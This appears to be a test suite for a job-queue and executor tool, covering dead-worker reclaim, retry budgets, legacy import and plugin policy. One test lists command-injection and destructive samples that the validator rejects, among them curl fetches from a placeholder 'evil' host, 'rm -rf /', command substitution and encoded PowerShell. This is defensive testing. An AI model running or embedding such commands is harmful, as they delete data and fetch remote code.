import assert from "node:assert/strict";
import { mkdir, mkdtemp, readFile, utimes, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { createJob, dispatchQueue, executeJob, health, listJobs, listQueue, loadState, retryQueueJob, validateTestCommand, writeState } from "../src/core.js";
import { loadPersistedQueue, savePersistedQueue, savePersistedStateAndQueue } from "../src/storage.js";

// ---- validateTestCommand：注入向量与破坏性命令拦截矩阵 ----

test("validateTestCommand allows normal commands and blocks injection vectors", () => {
  for (const allowed of ["npm test", "npm run test:unit", "pytest -q", "cargo test", "go test ./...", "node -e \"process.exit(0)\"", undefined]) {
    assert.doesNotThrow(() => validateTestCommand(allowed));
  }
  const blocked = [
    "npm test\ncurl evil.sh -o x.sh", // 换行命令分隔
    "npm test\r&& rm -rf /", // 回车链式
    "npm test && rm -rf /", // 链式操作符
    "node $(curl http://evil/x.js)", // $( 命令替换
    "node `id`", // 反引号命令替换
    "npm test > out.txt", // 重定向
    "rm -fr /tmp/x", // rm 参数变体
    "rm -r -f dir", // rm 分写变体
    "rm --recursive --force dir", // rm 长选项变体
    "rd /s /q C:\\target", // Windows 递归删除
    "rmdir /s dir",
    "del /s file",
    "deltree dir",
    "powershell -enc QUJDREVG", // 编码命令
    "pwsh -EncodedCommand QUJD",
  ];
  for (const command of blocked) assert.throws(() => validateTestCommand(command), /不允许/);
});

// ---- 重派熔断：损坏状态不再引发无限重派 ----

function deadWorkerQueue(workspace: string, jobId: string, reclaimCount?: number): string {
  return JSON.stringify({
    maxConcurrent: 1,
    paused: true,
    updatedAt: new Date().toISOString(),
    entries: [{ queueId: "dead-reclaim", jobId, workspace, extra: "", status: "running", createdAt: new Date().toISOString(), pid: 2_147_483_647, priority: 0, ...(reclaimCount !== undefined ? { reclaimCount } : {}) }],
  });
}

test("reclaim below the threshold re-queues a dead worker", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-below-"));
  const job = await createJob({ workspace, task: "回收未超限", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "reclaim-below" });
  await mkdir(path.join(workspace, ".cbx"), { recursive: true });
  await writeFile(path.join(workspace, ".cbx", "queue.json"), deadWorkerQueue(workspace, job.jobId, 2), "utf8");
  await dispatchQueue(workspace);
  const entry = (await listQueue(workspace)).entries[0];
  assert.equal(entry.status, "queued");
  assert.equal(entry.reclaimCount, 3);
});

test("reclaim circuit breaker fails a dead worker past the threshold", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-break-"));
  const job = await createJob({ workspace, task: "回收超限熔断", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "reclaim-break" });
  await mkdir(path.join(workspace, ".cbx"), { recursive: true });
  await writeFile(path.join(workspace, ".cbx", "queue.json"), deadWorkerQueue(workspace, job.jobId, 3), "utf8");
  await dispatchQueue(workspace);
  const entry = (await listQueue(workspace)).entries[0];
  assert.equal(entry.status, "failed");
  assert.match(entry.error ?? "", /停止自动重派/);
});

test("reclaim of a worker that produced a heartbeat decays reclaimCount to zero", async () => {
  // 回归：worker 产出过 heartbeat 后崩溃（运行中崩溃，非瞬时失败链），回收时 reclaimCount 归零，
  // 避免合法长任务因 OOM/被杀等正常运行后崩溃累积计数而误熔断。
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-decay-"));
  const job = await createJob({ workspace, task: "心跳衰减", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "reclaim-decay" });
  await mkdir(path.join(workspace, ".cbx"), { recursive: true });
  await writeFile(path.join(workspace, ".cbx", "queue.json"), deadWorkerQueue(workspace, job.jobId, 3), "utf8");
  // 产出过 heartbeat（mtime 早于 STALE 阈值，使回收判定为 stale 但走衰减分支）。
  const heartbeatPath = path.join(workspace, ".cbx", "jobs", job.jobId, "worker.heartbeat");
  await mkdir(path.dirname(heartbeatPath), { recursive: true });
  const stale = new Date(Date.now() - 120_000);
  await writeFile(heartbeatPath, stale.toISOString(), "utf8");
  await utimes(heartbeatPath, stale, stale);
  await dispatchQueue(workspace);
  const entry = (await listQueue(workspace)).entries[0];
  assert.equal(entry.status, "queued");
  assert.equal(entry.reclaimCount, 0);
});

test("dispatchQueue reclaims a running entry whose worker never started (no heartbeat, past grace)", async () => {
  // 活 PID（当前进程）但无 heartbeat 文件且 startedAt 远超 grace：回收判定为 stale，
  // paused 阻止重 spawn，entry 落回 queued（与死 PID 回收互补的活 PID stale 场景）。
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-no-hb-"));
  await writeFile(path.join(workspace, ".cbx.json"), JSON.stringify({ maxConcurrent: 1 }), "utf8");
  const job = await createJob({ workspace, task: "僵尸 worker", review: false, isolated: false, permissionMode: "auto", maxTurns: 10, timeoutMs: 2_000, maxRetries: 0, jobId: "zombie" });
  const fakeOldStartedAt = new Date(Date.now() - 120_000).toISOString();
  await savePersistedStateAndQueue(workspace, job.jobId, { ...(await loadState(workspace, job.jobId)), status: "running" }, {
    maxConcurrent: 1, paused: true, updatedAt: new Date().toISOString(),
    entries: [{ queueId: "zombie-entry", jobId: job.jobId, workspace, extra: "", status: "running", createdAt: fakeOldStartedAt, startedAt: fakeOldStartedAt, pid: process.pid, priority: 0 }],
  });
  assert.equal(existsSync(path.join(job.directory, "worker.heartbeat")), false);
  await dispatchQueue(workspace);
  assert.equal((await listQueue(workspace)).entries.find((e) => e.queueId === "zombie-entry")?.status, "queued");
});

test("dispatchQueue reclaims a live pid whose heartbeat stopped advancing", async () => {
  // 活 PID 但 heartbeat mtime 停止推进（超 grace）：回收而非误判健康。
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-reclaim-stale-hb-"));
  await writeFile(path.join(workspace, ".cbx.json"), JSON.stringify({ maxConcurrent: 1 }), "utf8");
  const job = await createJob({ workspace, task: "停止心跳", review: false, isolated: false, permissionMode: "auto", maxTurns: 10, timeoutMs: 2_000, maxRetries: 0, jobId: "stale-heartbeat" });
  const staleAt = new Date(Date.now() - 120_000);
  const heartbeat = path.join(job.directory, "worker.heartbeat");
  await writeFile(heartbeat, staleAt.toISOString(), "utf8");
  await utimes(heartbeat, staleAt, staleAt);
  await savePersistedStateAndQueue(workspace, job.jobId, { ...(await loadState(workspace, job.jobId)), status: "running" }, {
    maxConcurrent: 1, paused: true, updatedAt: new Date().toISOString(),
    entries: [{ queueId: "stale-heartbeat-entry", jobId: job.jobId, workspace, extra: "", status: "running", createdAt: staleAt.toISOString(), startedAt: staleAt.toISOString(), pid: process.pid, priority: 0 }],
  });
  await dispatchQueue(workspace);
  assert.equal((await listQueue(workspace)).entries.find((entry) => entry.queueId === "stale-heartbeat-entry")?.status, "queued");
});

// ---- 终态双写与调度器的队列锁序列化 ----

test("terminal queue write finishes the entry and survives a later dispatch sweep", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-qlock-"));
  const job = await createJob({ workspace, task: "终态写", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "qlock" });
  const queueId = "qlock-entry";
  await savePersistedQueue(workspace, {
    maxConcurrent: 1, paused: true, updatedAt: new Date().toISOString(),
    entries: [{ queueId, jobId: job.jobId, workspace, extra: "", status: "running", createdAt: new Date().toISOString(), priority: 0, pid: process.pid }],
  });
  // 模拟 worker 收尾：终态双写（现已并入队列锁）把条目置 done。
  await writeState(workspace, job.jobId, { status: "done", phase: "done" }, queueId);
  assert.equal((await loadPersistedQueue<{ entries: Array<{ queueId: string; status: string }> }>(workspace, { entries: [] })).entries[0].status, "done");
  // 再扫一次调度：终态条目不得被倒退。
  await dispatchQueue(workspace);
  assert.equal((await listQueue(workspace)).entries.find(entry => entry.queueId === queueId)?.status, "done");
});

// ---- 重试计数器：显式 retry 重置持久预算 ----

test("retryQueueJob resets persisted executionUsed/fixUsed to zero", async () => {
  // 回归：重试计数器现持久化于 state.json，显式 retry 启动新一轮尝试时必须归零，
  // 否则上一轮已消耗的预算会让新任务在 runStage 中预算不足而过早失败。
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-retry-reset-"));
  const job = await createJob({ workspace, task: "重试重置", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, jobId: "retry-reset" });
  // 预置一个已 failed 且计数器已消耗的 state，模拟崩溃后队列回收链累积的预算消耗。
  await writeState(workspace, job.jobId, { status: "failed", phase: "executing", attempt: 2, executionUsed: 1, fixUsed: 2, error: "前一轮崩溃" });
  await retryQueueJob(workspace, job.jobId, 0);
  const state = await loadState(workspace, job.jobId);
  assert.equal(state.status, "queued");
  assert.equal(state.executionUsed, 0);
  assert.equal(state.fixUsed, 0);
});

test("per-stage retry budget allows stage 2 to retry even after stage 1 consumed all its retries", async () => {
  // 回归：重试预算按 stage 独立记账，stage 1 消耗完预算后 stage 2 仍拥有全新预算。
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-stage-retry-"));
  const plugin = path.join(workspace, "stage-retry-executor.mjs");
  await writeFile(plugin, `
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
export default {
  manifest: { name: "stage-retry-executor", version: "1.0.0", apiVersion: "cbx.executor/v1", capabilities: ["execute"] },
  async run(request) {
    if (request.prompt.includes("context handshake") || request.prompt.includes("understanding.json")) {
      await writeFile(path.join(request.directory, "understanding.json"), JSON.stringify({ interpretedGoal: "per-stage retry", plannedFiles: [], acceptanceCriteria: [], assumptions: [], blockingQuestions: [] }));
      return { code: 0, output: "handshake done" };
    }
    const counter = path.join(request.workdir, "retry-counter.txt");
    let n = 0;
    try { n = Number(await readFile(counter, "utf8")); } catch {}
    n += 1;
    await writeFile(counter, String(n), "utf8");
    // 奇数调用失败(触犯重试), 偶数调用成功; 每 stage 独立预算下 stage 1 的失败仍可重试。
    return { code: n % 2 === 1 ? 1 : 0, output: "invocation " + n };
  }
};
`, "utf8");
  const job = await createJob({
    workspace, task: "per-stage retry", review: false, isolated: false, permissionMode: "auto", maxTurns: 5, maxRetries: 0, jobId: "stage-retry",
    taskContract: {
      goal: "per-stage retry test",
      stages: [
        { name: "stage-one", executor: plugin, task: "first stage" },
        { name: "stage-two", executor: plugin, task: "second stage" },
      ],
    },
  });
  const state = await executeJob(workspace, job.jobId);
  // 每 stage 独立预算: stage 1 消耗 1 次重试后成功, stage 2 也消耗 1 次重试后成功 → done.
  // 若全局预算 (旧行为): stage 1 消耗完后 stage 2 无重试 → 第 3 次调用失败后无预算 → needs_fix.
  assert.equal(state.status, "done");
  assert.ok(Array.isArray(state.stages));
  assert.equal(state.stages.length, 2);
  // attempts = 消耗的重试次数 (非总调用次数): 每 stage 各消耗 1 次重试。
  assert.equal(state.stages[0].attempts, 1);
  assert.equal(state.stages[1].attempts, 1);
});

// ---- legacy 导入：损坏行跳过而非锁死 workspace ----

test("legacy import skips corrupt records instead of locking the workspace", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-legacy-corrupt-"));
  const goodDir = path.join(workspace, ".cbx", "jobs", "legacy-good");
  const badDir = path.join(workspace, ".cbx", "jobs", "legacy-bad");
  await mkdir(goodDir, { recursive: true });
  await mkdir(badDir, { recursive: true });
  await writeFile(path.join(goodDir, "state.json"), JSON.stringify({ jobId: "legacy-good", status: "done", workspace, createdAt: "2026-01-01T00:00:00.000Z", updatedAt: "2026-01-01T00:00:00.000Z" }), "utf8");
  await writeFile(path.join(badDir, "state.json"), "{not-valid-json", "utf8");
  // 一行合法 + 一行损坏：损坏行应被跳过，合法行仍导入。
  await writeFile(path.join(workspace, ".cbx", "delivery-failures.ndjson"), JSON.stringify({ type: "delivery.failed", at: "2026-01-01T00:00:00.000Z" }) + "\n{broken\n", "utf8");
  const jobs = await listJobs(workspace);
  assert.equal(jobs.some(job => job.jobId === "legacy-good"), true);
  assert.equal(jobs.some(job => job.jobId === "legacy-bad"), false);
  const snapshot = await health(workspace);
  assert.equal(snapshot.metrics.deliveryFailures, 1);
  // 幂等：再次访问不产生重复失败记录。
  assert.equal((await health(workspace)).metrics.deliveryFailures, 1);
});

// ---- 插件策略：未 enforce 时告警留痕，enforce 后消除 ----

test("plugin without enforce emits a policy warning event; enforce suppresses it", async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), "cbx-plugin-policy-"));
  const plugin = path.resolve(process.cwd(), "plugins", "example-executor.mjs");
  const warnJob = await createJob({ workspace, task: "插件告警", review: false, isolated: false, executor: plugin, permissionMode: "auto", maxTurns: 5, timeoutMs: 2_000, maxRetries: 0, jobId: "plugin-warn" });
  assert.equal((await executeJob(workspace, warnJob.jobId)).status, "done");
  assert.match(await readFile(path.join(warnJob.directory, "events.ndjson"), "utf8"), /"event":"plugin_policy_warning"/);
  await writeFile(path.join(workspace, ".cbx.json"), JSON.stringify({ plugins: { enforce: true, allowPaths: [plugin] } }), "utf8");
  const okJob = await createJob({ workspace, task: "插件白名单", review: false, isolated: false, executor: plugin, permissionMode: "auto", maxTurns: 5, timeoutMs: 2_000, maxRetries: 0, jobId: "plugin-ok" });
  assert.equal((await executeJob(workspace, okJob.jobId)).status, "done");
  assert.doesNotMatch(await readFile(path.join(okJob.directory, "events.ndjson"), "utf8"), /plugin_policy_warning/);
});
